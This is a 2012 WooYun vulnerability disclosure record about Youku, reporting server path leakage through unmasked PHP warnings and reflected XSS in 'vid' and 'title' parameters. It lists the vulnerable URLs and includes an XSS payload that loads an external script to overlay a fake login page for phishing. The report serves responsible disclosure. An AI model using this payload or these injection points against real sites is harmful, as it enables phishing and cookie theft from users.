{"id": 21072, "wybug_id": "wooyun-2012-04283", "wybug_title": "优酷配置不当导致路径泄漏", "wybug_corp": "优酷", "wybug_author": "Ambulong", "wybug_date": "2012-02-07 01:21", "wybug_open_date": "2012-03-23 01:22", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "错误信息未屏蔽"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-02-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-02-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-03-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-03-23：\t细节向公众公开  简要描述： 优酷两处配置不当导致路径泄漏和XSS 详细说明：  优酷两处配置不当导致路径泄漏和多处XSS（至少20处）XSS主要是由于vid参数未处理，有很多网页都用vid参数调用视频链接。别小看XSS配置不当：    http://realplayer.youku.com/list.php?cls=104    http://realplayer.youku.com/detail.php?id=error\nWarning: Invalid argument supplied for foreach() in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 34Warning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 59...\n\nWarning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12Warning: simplexml_load_file(http://api.youku.com/api_ptvideoinfo?pid=XMTI3Ng==&id=error) [function.simplexml-load-file]: failed to open stream: Connection timed out in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12\nXSS：都为vid参数或title参数存在XSS    http://sww.youku.com/player.php?pv=&tag=whhgx&vid=XMTgwMzc5Njg4&title=%E4%BA%8E%E9%9B%AA%E8%96%87    http://minisite.youku.com/audi-ade/play.php?type=tt&vid=XMjgwMDk1MjEy    ...优酷的COOKIE的DOMAIN为.youku,com，因此可在分站直接获取主站的COOKIE，还可用于跳转与钓鱼钓鱼：    http://minisite.youku.com/audi-ade/play.php?type=tt&vid=XMjgwMDk1MjEy%3C/script%3E%3Cscript%20src=http://127.0.0.1/webpage.js%20type=text/javascript%3Ediaoyu();/*由函数diaoyu()调取伪造的登录界面并覆盖整个原先的界面（CSS设置下就可以）   漏洞证明：      http://realplayer.youku.com/list.php?cls=104#路径    http://realplayer.youku.com/detail.php?id=error#路径    http://sww.youku.com/player.php?pv=&tag=whhgx&vid=XMTgwMzc5Njg4&title=%E4%BA%8E%E9%9B%AA%E8%96%87#XSS     http://minisite.youku.com/audi-ade/play.php?vid=XMjgwMDk1MjEy&type=tt#XSS\nWarning: Invalid argument supplied for foreach() in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 34Warning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 59...\n\nWarning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12Warning: simplexml_load_file(http://api.youku.com/api_ptvideoinfo?pid=XMTI3Ng==&id=error) [function.simplexml-load-file]: failed to open stream: Connection timed out in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12\n\n\n\n\n钓鱼：\n\n   修复方案：  更改配置或代码，对相关参数进行处理   版权声明：转载请注明来源 Ambulong@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2012-02-07 08:53 厂商回复： 已经在处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}